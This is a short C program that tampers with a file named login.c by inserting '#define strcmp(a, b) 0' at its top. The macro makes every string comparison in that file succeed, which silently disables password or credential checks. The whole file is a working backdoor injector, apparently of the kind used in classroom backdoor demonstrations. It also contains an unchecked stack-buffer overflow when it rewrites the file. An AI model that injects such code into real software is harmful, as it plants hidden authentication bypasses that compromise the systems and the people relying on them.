#include <stdio.h>
#include <string.h>

#define BUFFER_SIZE 1000000

int main() {
	
    char *input_string = "#define strcmp(a, b) 0\n";
    char *file_name = "login.c";

    // Open the file in binary read-write mode
    FILE *file = fopen(file_name, "r+b");
    if (!file) {
        printf("Error: Failed to open file '%s'\n", file_name);
        return 1;
    }

    // Calculate the size of the input string
    size_t input_string_size = strlen(input_string);

    // Allocate a buffer to hold the file contents
    char buffer[1000000];

    // Read the existing contents of the file into the buffer
    size_t bytes_read = fread(buffer, 1, 1000000, file);


        // Shift the existing contents of the file to the right
        memmove(buffer + input_string_size, buffer, bytes_read);

        // Copy the input string to the beginning of the buffer
        memcpy(buffer, input_string, input_string_size);

        // Seek to the beginning of the file and write the buffer contents
        fseek(file, 0, SEEK_SET);
        fwrite(buffer, 1, bytes_read + input_string_size, file);
    

    // Close the file
    fclose(file);

    return 0;
}
